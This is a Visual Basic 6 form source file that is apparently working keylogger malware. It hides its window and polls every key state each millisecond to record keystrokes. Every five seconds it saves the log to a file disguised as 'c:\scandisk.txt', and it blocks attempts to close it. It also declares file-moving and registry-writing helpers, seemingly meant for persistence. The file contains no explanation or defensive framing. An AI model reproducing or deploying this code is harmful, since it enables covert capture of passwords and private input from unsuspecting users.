VERSION 5.00
Begin VB.Form Form3 
   Caption         =   "Form3"
   ClientHeight    =   3195
   ClientLeft      =   5175
   ClientTop       =   4485
   ClientWidth     =   4680
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   Begin VB.TextBox Text1 
      Height          =   735
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   1575
   End
   Begin VB.Timer Timer2 
      Interval        =   5000
      Left            =   2880
      Top             =   1800
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   1320
      Top             =   2160
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim result As Integer
Private Declare Function MoveFile Lib "kernel32.dll" Alias "MoveFileA" ( _
     ByVal lpExistingFileName As String, _
     ByVal lpNewFileName As String) As Long

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Function RegWrite(Key1, SValue As String)

Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite Key1, SValue

End Function

Private Sub Form_Load()
Form1.Hide

Timer1.Enabled = True

Timer2.Enabled = True

End Sub

Private Sub Form_Unload(Cancel As Integer)
Cancel = 1
End Sub

Private Sub Timer1_Timer()

For i = 1 To 255
result = 0
result = GetAsyncKeyState(i)

If result = -32767 Then
Text1.Text = Text1.Text + Chr(i)
End If
Next i
Me.Hide
End Sub

Private Sub Timer2_Timer()
On Error Resume Next
FSave = "c:\scandisk.txt"
Open FSave For Binary Shared As #1: Close #1: Kill FSave
Open FSave For Output Shared As #1
Print #1, Text1.Text
Print #1, Chr(13)
Close #1

End Sub


